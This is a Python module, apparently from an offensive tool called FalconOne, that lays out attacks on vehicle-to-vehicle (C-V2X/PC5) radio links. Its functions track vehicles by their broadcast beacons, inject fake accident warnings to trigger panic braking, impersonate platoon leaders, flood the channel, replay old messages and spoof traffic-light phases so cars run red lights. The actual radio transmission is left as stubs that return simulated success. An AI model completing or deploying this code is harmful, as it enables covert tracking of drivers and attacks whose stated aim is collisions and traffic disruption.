"""
FalconOne V2X/C-V2X Exploitation Module (v1.5.3)
Targets: PC5 sidelink (LTE-V2X, NR-V2X), vehicle tracking, emergency message spoofing
Author: FalconOne Development Team
"""

import logging
import numpy as np
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime
import struct

try:
    from ..utils.logger import ModuleLogger
except ImportError:
    class ModuleLogger:
        def __init__(self, name, parent):
            self.logger = logging.getLogger(name) if parent is None else parent.getChild(name)
        def info(self, msg, **kw): self.logger.info(f"{msg} {kw if kw else ''}")
        def warning(self, msg, **kw): self.logger.warning(f"{msg} {kw if kw else ''}")
        def error(self, msg, **kw): self.logger.error(f"{msg} {kw if kw else ''}")
        def debug(self, msg, **kw): self.logger.debug(f"{msg} {kw if kw else ''}")


class V2XMessage:
    """V2X message structure (CAM, DENM, BSM, etc.)"""
    
    # Message types
    CAM = 'Cooperative Awareness Message'  # Periodic beacons
    DENM = 'Decentralized Environmental Notification Message'  # Event-driven
    BSM = 'Basic Safety Message'  # US standard
    
    def __init__(self, msg_type: str, station_id: int, latitude: float, 
                 longitude: float, speed_mps: float, heading_deg: float):
        self.msg_type = msg_type
        self.station_id = station_id
        self.latitude = latitude
        self.longitude = longitude
        self.speed_mps = speed_mps
        self.heading_deg = heading_deg
        self.timestamp = datetime.now()
    
    def encode(self) -> bytes:
        """Encode message to binary (simplified UPER encoding)"""
        # Placeholder for actual ASN.1 UPER encoding
        data = struct.pack(
            '!IddffQ',
            self.station_id,
            self.latitude,
            self.longitude,
            self.speed_mps,
            self.heading_deg,
            int(self.timestamp.timestamp())
        )
        return data
    
    @staticmethod
    def decode(data: bytes) -> 'V2XMessage':
        """Decode binary message (simplified)"""
        unpacked = struct.unpack('!IddffQ', data)
        msg = V2XMessage(
            V2XMessage.CAM,
            unpacked[0],  # station_id
            unpacked[1],  # latitude
            unpacked[2],  # longitude
            unpacked[3],  # speed_mps
            unpacked[4]   # heading_deg
        )
        msg.timestamp = datetime.fromtimestamp(unpacked[5])
        return msg


class V2XExploitEngine:
    """
    C-V2X/PC5 Sidelink Exploitation Engine
    Targets: Vehicle tracking, emergency message injection, platoon disruption
    Requires: srsRAN with sidelink extensions, PC5 SDR capability
    """
    
    def __init__(self, config, logger: Optional[logging.Logger] = None):
        self.config = config
        
        # Handle logger initialization
        if logger is None:
            logger = logging.getLogger('FalconOne')
        self.logger = ModuleLogger('Exploit-V2X', logger)
        
        # Configuration
        self.v2x_enabled = config.get('exploit.v2x.enabled', True) if hasattr(config, 'get') else True
        self.pc5_frequency_mhz = config.get('exploit.v2x.pc5_frequency_mhz', 5900) if hasattr(config, 'get') else 5900
        
        # Tracked vehicles
        self.tracked_vehicles: Dict[int, List[V2XMessage]] = {}
        
        # Active attacks
        self.active_attacks = []
        
        self.logger.info("V2X Exploitation Engine initialized (v1.5.3)",
                       v2x_enabled=self.v2x_enabled,
                       pc5_freq=f"{self.pc5_frequency_mhz} MHz")
    
    def sniff_v2x_messages(self, duration_sec: int = 60) -> List[V2XMessage]:
        """
        Sniff V2X messages from PC5 sidelink
        
        Args:
            duration_sec: Sniffing duration in seconds
            
        Returns:
            List of captured V2X messages
        """
        self.logger.info(f"Sniffing V2X messages for {duration_sec} seconds",
                       frequency=f"{self.pc5_frequency_mhz} MHz")
        
        # Placeholder for SDR/srsRAN integration
        captured_messages = []
        
        # TODO: Integrate with srsRAN PC5 receiver
        # In production: Capture PSSCH/PSCCH physical channels
        
        # Simulated capture
        for i in range(10):  # Simulate 10 vehicles
            msg = V2XMessage(
                V2XMessage.CAM,
                station_id=1000 + i,
                latitude=37.7749 + np.random.uniform(-0.01, 0.01),
                longitude=-122.4194 + np.random.uniform(-0.01, 0.01),
                speed_mps=20.0 + np.random.uniform(-5, 5),
                heading_deg=np.random.uniform(0, 360)
            )
            captured_messages.append(msg)
            
            # Update tracking database
            if msg.station_id not in self.tracked_vehicles:
                self.tracked_vehicles[msg.station_id] = []
            self.tracked_vehicles[msg.station_id].append(msg)
        
        self.logger.info(f"Captured {len(captured_messages)} V2X messages",
                       unique_vehicles=len(self.tracked_vehicles))
        
        return captured_messages
    
    def track_vehicle(self, station_id: int) -> Dict[str, Any]:
        """
        Track a specific vehicle using CAM messages
        
        Args:
            station_id: Target vehicle station ID
            
        Returns:
            Vehicle trajectory and metadata
        """
        if station_id not in self.tracked_vehicles:
            return {'tracked': False, 'reason': 'vehicle_not_found'}
        
        trajectory = self.tracked_vehicles[station_id]
        
        # Calculate trajectory statistics
        latitudes = [msg.latitude for msg in trajectory]
        longitudes = [msg.longitude for msg in trajectory]
        speeds = [msg.speed_mps for msg in trajectory]
        
        self.logger.info(f"Tracking vehicle {station_id}",
                       positions=len(trajectory),
                       avg_speed=f"{np.mean(speeds):.2f} m/s")
        
        return {
            'tracked': True,
            'station_id': station_id,
            'trajectory': [(msg.latitude, msg.longitude, msg.timestamp) for msg in trajectory],
            'avg_speed_mps': float(np.mean(speeds)),
            'current_position': (trajectory[-1].latitude, trajectory[-1].longitude) if trajectory else None,
            'num_samples': len(trajectory)
        }
    
    def inject_emergency_message(self, target_area: Tuple[float, float], 
                                 radius_m: float = 500,
                                 message_type: str = 'DENM') -> Dict[str, Any]:
        """
        Inject fake emergency V2X message (e.g., false accident warning)
        Causes panic braking, rerouting, or traffic disruption
        
        Args:
            target_area: (latitude, longitude) of fake incident
            radius_m: Alert radius in meters
            message_type: 'DENM' or 'BSM'
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"Injecting fake emergency message at {target_area}",
                          radius=f"{radius_m} m",
                          type=message_type)
        
        # Craft malicious DENM
        fake_denm = V2XMessage(
            V2XMessage.DENM,
            station_id=9999,  # Fake station ID
            latitude=target_area[0],
            longitude=target_area[1],
            speed_mps=0.0,  # Stationary incident
            heading_deg=0.0
        )
        
        attack_params = {
            'attack_type': 'v2x_emergency_injection',
            'message_type': message_type,
            'target_area': target_area,
            'radius_m': radius_m,
            'fake_station_id': 9999,
            'timestamp': datetime.now().isoformat()
        }
        
        # Execute injection (transmit via PC5 sidelink)
        success = self._execute_message_injection(fake_denm)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info("Emergency message injection successful")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'expected_impact': 'traffic_disruption'
        }
    
    def disrupt_vehicle_platoon(self, platoon_id: int, 
                               target_station_id: int) -> Dict[str, Any]:
        """
        Disrupt cooperative driving platoon by injecting false CAM messages
        Causes platoon fragmentation or emergency braking
        
        Args:
            platoon_id: Target platoon identifier
            target_station_id: Leader or specific vehicle to impersonate
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"Disrupting platoon {platoon_id}",
                          target_vehicle=target_station_id)
        
        # Craft malicious CAM (sudden deceleration)
        if target_station_id in self.tracked_vehicles and self.tracked_vehicles[target_station_id]:
            last_msg = self.tracked_vehicles[target_station_id][-1]
            fake_cam = V2XMessage(
                V2XMessage.CAM,
                station_id=target_station_id,
                latitude=last_msg.latitude,
                longitude=last_msg.longitude,
                speed_mps=-10.0,  # Impossible negative speed triggers emergency
                heading_deg=last_msg.heading_deg
            )
        else:
            fake_cam = V2XMessage(V2XMessage.CAM, target_station_id, 0.0, 0.0, -10.0, 0.0)
        
        attack_params = {
            'attack_type': 'platoon_disruption',
            'platoon_id': platoon_id,
            'target_station_id': target_station_id,
            'fake_speed_mps': -10.0,
            'timestamp': datetime.now().isoformat()
        }
        
        success = self._execute_message_injection(fake_cam)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"Platoon {platoon_id} disruption successful")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'expected_impact': 'platoon_fragmentation'
        }
    
    def dos_v2x_channel(self, duration_sec: int = 60) -> Dict[str, Any]:
        """
        Denial-of-Service attack on PC5 sidelink channel
        Floods channel with high-rate invalid messages
        
        Args:
            duration_sec: Attack duration in seconds
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"V2X channel DoS for {duration_sec} seconds",
                          frequency=f"{self.pc5_frequency_mhz} MHz")
        
        attack_params = {
            'attack_type': 'v2x_channel_dos',
            'duration_sec': duration_sec,
            'message_rate_hz': 100,  # 100 msg/sec (vs normal 10 msg/sec)
            'frequency_mhz': self.pc5_frequency_mhz,
            'timestamp': datetime.now().isoformat()
        }
        
        # Execute DoS (transmit high-rate messages)
        success = self._execute_channel_dos(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info("V2X channel DoS active")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'expected_impact': 'communication_disruption'
        }
    
    def replay_attack(self, target_station_id: int, 
                     timestamp_offset_sec: int = -300) -> Dict[str, Any]:
        """
        Replay old V2X messages to confuse neighboring vehicles
        Exploits lack of timestamp validation in some implementations
        
        Args:
            target_station_id: Station ID to impersonate
            timestamp_offset_sec: How old the replayed message is (default -300 = 5 min old)
            
        Returns:
            Attack result dictionary
        """
        if target_station_id not in self.tracked_vehicles or not self.tracked_vehicles[target_station_id]:
            return {'success': False, 'reason': 'no_messages_to_replay'}
        
        # Get old message
        old_msg = self.tracked_vehicles[target_station_id][0]
        
        self.logger.warning(f"Replaying message from station {target_station_id}",
                          age=f"{-timestamp_offset_sec} seconds")
        
        attack_params = {
            'attack_type': 'v2x_replay_attack',
            'target_station_id': target_station_id,
            'original_timestamp': old_msg.timestamp.isoformat(),
            'replay_offset_sec': timestamp_offset_sec,
            'timestamp': datetime.now().isoformat()
        }
        
        success = self._execute_message_injection(old_msg)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info("V2X replay attack successful")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'expected_impact': 'confusion_collision_risk'
        }
    
    def spoof_traffic_light_signal(self, intersection_lat: float, 
                                   intersection_lon: float,
                                   signal_phase: str = 'red') -> Dict[str, Any]:
        """
        Spoof SPaT (Signal Phase and Timing) message
        Tricks vehicles into running red lights or stopping at green lights
        
        Args:
            intersection_lat: Intersection latitude
            intersection_lon: Intersection longitude
            signal_phase: 'red', 'yellow', 'green'
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"Spoofing traffic light at ({intersection_lat}, {intersection_lon})",
                          phase=signal_phase)
        
        attack_params = {
            'attack_type': 'spat_spoofing',
            'intersection': (intersection_lat, intersection_lon),
            'fake_phase': signal_phase,
            'timestamp': datetime.now().isoformat()
        }
        
        # Create fake SPaT message (simplified)
        # TODO: Implement full SPaT encoding
        success = True  # Simulated
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info("SPaT spoofing successful")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'expected_impact': 'traffic_violation_collision'
        }
    
    def get_tracked_vehicles(self) -> Dict[int, Dict[str, Any]]:
        """Get summary of all tracked vehicles"""
        summary = {}
        for station_id, messages in self.tracked_vehicles.items():
            if messages:
                latest = messages[-1]
                summary[station_id] = {
                    'station_id': station_id,
                    'last_position': (latest.latitude, latest.longitude),
                    'last_speed_mps': latest.speed_mps,
                    'last_seen': latest.timestamp.isoformat(),
                    'num_messages': len(messages)
                }
        return summary
    
    def get_active_attacks(self) -> List[Dict[str, Any]]:
        """Get list of active V2X attacks"""
        return self.active_attacks
    
    def stop_attack(self, attack_id: int) -> bool:
        """Stop a specific attack by index"""
        if 0 <= attack_id < len(self.active_attacks):
            attack = self.active_attacks.pop(attack_id)
            self.logger.info(f"Stopped attack: {attack['attack_type']}")
            return True
        return False
    
    # ==================== PRIVATE EXECUTION METHODS ====================
    
    def _execute_message_injection(self, message: V2XMessage) -> bool:
        """
        Execute V2X message injection via PC5 sidelink
        In production: Integrate with srsRAN sidelink transmitter
        """
        self.logger.debug(f"Injecting V2X message: {message.msg_type}, Station {message.station_id}")
        # TODO: Call srsRAN PC5 transmit API
        return True  # Simulated success
    
    def _execute_channel_dos(self, params: Dict[str, Any]) -> bool:
        """Execute V2X channel DoS attack"""
        self.logger.debug(f"Executing V2X DoS: {params}")
        # TODO: High-rate PC5 transmission
        return True
    
    def generate_attack_report(self) -> Dict[str, Any]:
        """Generate comprehensive V2X attack report"""
        return {
            'total_attacks': len(self.active_attacks),
            'attack_types': [a['attack_type'] for a in self.active_attacks],
            'active_attacks': self.active_attacks,
            'tracked_vehicles': len(self.tracked_vehicles),
            'timestamp': datetime.now().isoformat()
        }
